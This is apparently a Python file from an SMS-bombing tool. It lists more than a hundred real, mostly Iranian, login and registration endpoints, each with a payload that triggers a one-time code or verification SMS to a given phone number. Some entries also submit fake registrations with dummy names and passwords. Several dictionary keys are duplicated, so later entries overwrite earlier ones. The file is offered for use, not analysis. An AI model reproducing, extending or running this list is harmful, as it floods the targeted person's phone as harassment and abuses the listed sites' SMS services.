def send_otp_requests(number):
    url_payload_map = {
        'komodaa': ('https://api.komodaa.com/api/v2.6/loginRC/request', {"phone_number":'0' + number}),
        'janebi': ('https://janebi.com/signin?do', {'resend': '0' + number}),
        '4hair': ('https://4hair.ir/user/login.php', {'num': '0' + number,'ok':''}),
        'igame': ('https://igame.ir/api/play/otp/send', {'phone': '0' + number}),
        'komodaa': ('https://api.komodaa.com/api/v2.6/loginRC/request', {"phone_number":'0' + number}),
        'karlancer': ('https://www.karlancer.com/api/register', {"phone": number,"role": "freelancer"}),
        'hsaria': ('https://www.hsaria.com/MemberRegisterLogin', {"phone": number}),
        'twsms': ('https://twsms.ir/client/register.php', {'mobile': '0' + number,'agree':'agree','sendsms':'1'}),
        'baradarantoy': ('https://baradarantoy.ir/send_confirm_sms_ajax.php', {'user_tel': '0' + number}),
        'kavirmotor': ('https://kavirmotor.com/sms/send', {'phoneNumber': '0' + number}),
        'chechilas': ('https://chechilas.com/user/login', {'mob': '0' + number}),
        'chechilas': ('https://searchii.ir//controler//phone_otp.php', {'mobile_number': '0' + number,'action':'send_otp','login':'user'}),
        'badparak': ('https://badparak.com/register/request_verification_code', {'mobile': '0' + number}),
        'hermeskala': ('https://hermeskala.com//login/send_vcode', {'mobile_number': '0' + number}),
        'elinorboutique': ('https://api.elinorboutique.com/v1/customer/register-login', {'mobile': '0' + number}),
        'atlasmode': ('https://api.atlasmode.ir/v1/customer/register-login?version=new2', {'mobile': '0' + number}),
        'pooshakshoniz': ('https://api.pooshakshoniz.com/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
        'ubike': ('https://ubike.ir/index.php?route=extension/module/websky_otp/send_code', {'telephone': '0' + number}),
        'benedito': ('https://api.benedito.ir/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
        'rubeston': ('https://www.rubeston.com/api/customers/login-register', {'mobile': '0' + number,'step':'1'}),
        'primashop': ('https://primashop.ir/index.php?route=extension/module/websky_otp/send_code', {'telephone' : '0' + number}),
        'payagym': ('https://payagym.com/wp-admin/admin-ajax.php', {'mobile': '0' + number,'action':'kerasno_proform_register_inline_send'}),
        'bartarinha': ('https://bartarinha.com/Advertisement/Users/RequestLoginMobile', {'mobileNo': '0' + number,'X-Requested-With':'XMLHttpRequest'}),
        'manoshahr': ('https://manoshahr.ir/jq.php', {'mobile': '0' + number,'class_name':'public_login','function_name':'sendCode'}),
        'nalinoco': ('https://www.nalinoco.com/api/customers/login-register', {'mobile': '0' + number,'ReturnUrl':'/','step':'1'}),
        'hiss': ('https://hiss.ir/wp-admin/admin-ajax.php', {'phone_email': '0' + number,'action':'bakala_send_code'}),
        'tahrir-online': ('https://tahrir-online.ir/wp-admin/admin-ajax.php', {'phone': '+98' + number,'form':'register','action':'mobix_send_otp_code'}),
        'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
        'martday': ('https://martday.ir/api/customer/member/register/', {'email': '0' + number,'accept_term':'on'}),
        'paaakar': ('https://api.paaakar.com/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
        'electrastore': ('https://electrastore.ir/index.php?route=extension/module/websky_otp/send_code', {'telephone': '0' + number}),
        'atrinelec': ('https://www.atrinelec.com/ajax/SendSmsVerfiyCode', {'mobile': '0' + number}),
        'ketabweb': ('https://ketabweb.com/login/?usernameCheck=1', {'username': '0' + number}),
        'dastaneman': ('https://dastaneman.com/User/SendCode', {'mobile': '0098' + number}),
        '80w': ('https://80w.ir/wp-admin/admin-ajax.php', {'login': '0' + number,'action':'logini_first'}),
        'noavarpub': ('https://noavarpub.com/logins/login.php?ref=https%3A%2F%2Fnoavarpub.com%2F', {'phone': '0' + number,'submit':'123'}),
        'hovalvakil': ('https://api.hovalvakil.com/api/User/SendConfirmCode?userName='+ number +'', None),
        'digighate': ('https://api.digighate.com/v2/public/code?phone='+ number +'', None),
        'azarbadbook': ('https://azarbadbook.ir/ajax/login_j_ajax_ver/', {'phone': number}),
        'kanoonbook': ('https://www.kanoonbook.ir/store/customer_otp', {'customer_username': number,'task':'customer_phone'}),
        'cheshmandazketab': ('https://www.cheshmandazketab.ir/Register', {'phone': '0' + number,'login':'1'}),
        'ketabir': ('https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=0'+number+'&OtpSmsType=1', None),
        'snappshop': ('https://apix.snappshop.co/auth/v1/pre-login?lat=35.77331&lng=51.418591', {'mobile': '0' + number}),
        'ketabium': ('https://www.ketabium.com/login-register', {'username': '0' + number}),
        'rirabook': ('https://rirabook.com/loginAth', {'mobile1': '0' + number,'loginbt1':''}),
        'pashikshoes': ('https://api.pashikshoes.com/v1/customer/register-login', {'mobile': '0' + number}),
        'shimashoes': ('https://shimashoes.com/api/customer/member/register/', { 'email': '0' + number}),
        'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number}),
        'buskool': ('https://www.buskool.com/send_verification_code', {'phone': '0' + number}),
        'tamimpishro': ('https://www.tamimpishro.com/site/api/v1/user/otp', {'mobile': '0' + number}),
        'fafait': ('https://api2.fafait.net/oauth/check-user', {'id': '0' + number}),
        'sheypoor': ('https://www.sheypoor.com/api/v10.0.0/auth/send', {'username': '0' + number}),
        'itoll': ('https://app.itoll.com/api/v1/auth/login', {'mobile': '0' + number}),
        'banimode': ('https://mobapi.banimode.com/api/v2/auth/request', {'phone': '0' + number}),
        'torob': ('https://api.torob.com/v4/user/phone/send-pin', {'phone_number': '0' + number}),
        'basalam': ('https://auth.basalam.com/otp-request', {'mobile': '0' + number}),
        'khanoumi': ('https://www.khanoumi.com/accounts/sendotp', {'mobile': '0' + number, 'redirectUrl': ''}),
        'fankala': ('https://fankala.com/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
        'arastag': ('https://arastag.ir/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
        'drdr': ('https://drdr.ir/api/registerEnrollment/verifyMobile', {'phoneNumber': '0' + number, 'userType': 'PATIENT'}),
        'itoll': ('https://app.itoll.ir/api/v1/auth/login', {'mobile': '0' + number}),
        'telewebion': ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', {'code': '98', 'phone': number, 'smsStatus': 'default'}),
        'gap': ('https://core.gap.im/v1/user/add.json', {'mobile': '+98' + number}),
        'caropex': ('https://caropex.com/api/v1/user/login', {'mobile': '0' + number}),
        'namava': ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', {'UserName': '+98' + number}),
        'snappapps': ('https://api.snapp.ir/api/v1/sms/link', {'phone': '0' + number}),
        'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php', {'action': 'stm_login_register', 'type': 'mobile', 'input': '0' + number}),
        'hamrahsport': ('https://hamrahsport.com/send-otp', {'cell': number, 'name': 'persian_string', 'agree': '1', 'send_otp': '1', 'otp': ''}),
        'harikashop': ('https://harikashop.com/login?back=my-account', {
            'username': '0' + number,
            'id_customer': '',
            'back': ['', 'https://harikashop.com/login?back=my-account'],
            'firstname': 'persian_string',
            'lastname': 'persian_string',
            'password': 'random_password',
            'action': 'register',
            'ajax': '1'
        }),
        'zzzagros': ('https://www.zzzagros.com/wp-admin/admin-ajax.php', {
            'action': 'ywp_ajax_register',
            'ywp_register': '1',
            'ywp_reg_mobile': '0' + number,
            'ywp_reg_password': 'random_password',
            'ajax_woocommerce_register_nonce': ''
        }),
        'dalfak': ('https://www.dalfak.com/api/auth/sendVerificationCode', {
            'type': 1,
            'value': '0' + number
        }),

        'doctoreto': ('https://api.doctoreto.com/api/web/patient/v1/accounts/register', {
            'country_id': 205,
            'mobile': number
        }),
        'digikalacall': ('https://api.digikala.com/v1/user/authenticate/', {
            'backUrl': '/',
            'username': '0' + number,
            'otp_call': 'true'
        }),
        'okala': ('https://api-react.okala.com/C/CustomerAccount/OTPRegister', {
            'mobile': '0' + number,
            'deviceTypeCode' :0,
            'confirmTerms': 'true',
            'notRobot': 'false',
        }),
        'digikala': ('https://api.digikala.com/v1/user/authenticate/', {
            'backUrl': '/',
            'username': '0' + number,
            'otp_call': 'false'
        }),
        'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0' + number
        }),
        'mellishoes': ('https://mellishoes.ir/wp-admin/admin-ajax.php', {
            'action': 'websima_auth_account_detection',
            'account_detection_nonce_field': '21737b7e2d',
            'mobile': '0' + number,
            '_wp_http_referer':'/'
        }),
        'setshoe': ('https://setshoe.ir/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0' + number,
        }),
        'maxbax': ('https://maxbax.com/wp-admin/admin-ajax.php', {
            'action': 'bakala_send_code',
            'phone_email': '0' + number,
        }),
        'shikstyle': ('https://shik.style/wp-admin/admin-ajax.php', {
            'action': 'login',
            'form=phone': number,
        }),
        'parkbag': ('https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber', {
            'ReturnUrl': 'https://parkbag.com/',
            'MobaileNumber': number,
        }),
        'digistyle': ('https://www.digistyle.com/users/login-register/', {
            'loginRegister[email_phone]': '0' + number,
        }),
        'telketab': ('https://telketab.com/opt_field/check_secret', {
            'identity': '0' + number,
            'secret': '',
            'plugin': 'otp_field_sms_processor',
            'key': 'otp_field_user_auth_form__otp_sms',
        }),
        'adinehbook': ('https://www.adinehbook.com/gp/flex/sign-in.html', {
            'action': 'sign',
            'phone_cell_or_email': '0' + number,
        }),
        'gitamehr': ('https://gitamehr.ir/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0' + number,
        }),
        'sunnybook': ('https://sunnybook.ir/Home/RegisterUser', {
            'name': 'Mr',
            'password': '123456',
            'mobile': number,
        }),
        'mahouney': ('https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber', {
            'ReturnUrl': 'https://mahouney.com/',
            'MobaileNumber': '0' + number,
        }),
        'myroz': ('https://myroz.ir/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0' + number,
        }),
        'meidane': ('https://meidane.com/accounts/login', {
            'name': 'Mr',
            'password': '123456',
            'mobile': number,
        }),
        'ickala': ('https://ickala.com/', {
            'controller': 'SendSMS','fc':'module',
            'module': 'loginbymobile','SubmitSmsSend':'1',
            'ajax': 'true',
            'otp_mobile_num':'0' + number
        }),
        'microele': ('https://www.microele.com/login?back=my-account', {
            'id_customer': '','back':',my-account',
            'firstname': '123','lastname':'123',
            'password': '123456','action':'register',
            'username':'0' + number,'ajax':'1'
        }),
        'elecmarket': ('https://elecmarket.ir/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register','type':'mobile',
            'input':'0' + number
        }),
        'techsiro': ('https://techsiro.com/send-otp', {
            'client': 'web','method':'POST','_token':'',
            'mobile':'0' + number
        }),
        'noavarpub': ('https://novinparse.com/Page/PageAction.aspx', {
            'Action': 'SendVerifyCode','verifyCode':'','repeatFlag':'true',
            'mobile':'0' + number
        }),
        'titomarket': ('https://titomarket.com/index.php?route=account/login_verify/verify', {
            'redirect': 'https://titomarket.com/my-account',
            'telephone':'0' + number
        }),
        'nikanbike': (f'https://nikanbike.com/?rand={number}', {
            'controller': 'authentication','back':'my-account','fc':'module',
            'ajax': 'true','module':'iverify',
            'phone_mobile':'0' + number,'SubmitCheck':''
        }),
        'account724': ('https://account724.com/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input':'0' + number
        }),
    }
    return list(url_payload_map.values())


 #_______________JSON DATA LINK API ___________________________
def send_otp_requests_json(number):
    url2_payload2_map = {
        'eaccount': ('https://eaccount.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
        'queenaccessories': ('https://queenaccessories.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
        'rastaraccessory': ('https://rastaraccessory.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
        'vinaaccessory': ('https://vinaaccessory.com/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
        'chortkehshop': ('https://chortkehshop.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
        'piinkstore': ('https://piinkstore.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
        'dreamlandshop': ('https://dreamlandshop.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
        
    }

    return list(url2_payload2_map.values())
    
